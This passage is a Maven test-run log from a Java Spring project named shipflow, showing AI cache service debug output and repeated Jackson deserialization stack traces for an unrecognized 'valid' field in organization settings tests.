2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 2 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 3 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 2
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 2 (withAI=true)
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 3 (withAI=true, hits=1)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=false, TTL=infinite)
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=false, hits=1)
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 1
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 1 (withAI=true)
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 1 (withAI=false)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.328Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.328Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$PitchRiskCacheTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.014 s -- in com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$DefaultSettingsCreationTests
2026-01-17T23:26:52.516Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.getSettings(OrganizationSettingsService.java:39) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$DefaultSettingsCreationTests.defaultSettingsShouldHaveCorrectCycleConfiguration(OrganizationSettingsServiceTest.java:455) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:52.521Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Failed to deserialize JSON

com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "valid" (class com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights), not marked as ignorable (4 known properties: "scopeWeight", "budgetWeight", "bugsWeight", "timeWeight"])
 at [Source: (String)"{"budgetWeight":25,"bugsWeight":30,"scopeWeight":25,"timeWeight":20,"valid":true}"; line: 1, column: 81] (through reference chain: com.github.farzadsedaghatbin.shipflow.dto.admin.OrganizationSettingsDTO$RiskWeights["valid"])
	at com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException.from(UnrecognizedPropertyException.java:61) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.DeserializationContext.handleUnknownProperty(DeserializationContext.java:1138) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.std.StdDeserializer.handleUnknownProperty(StdDeserializer.java:2224) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownProperty(BeanDeserializerBase.java:1709) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.handleUnknownVanilla(BeanDeserializerBase.java:1687) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:320) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:177) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:323) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4825) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3772) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3755) ~[jackson-databind-2.15.3.jar:2.15.3]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.fromJson(OrganizationSettingsService.java:355) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.toDTO(OrganizationSettingsService.java:297) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsService.getSettings(OrganizationSettingsService.java:39) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$DefaultSettingsCreationTests.defaultSettingsShouldEnableAllFeatures(OrganizationSettingsServiceTest.java:494) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
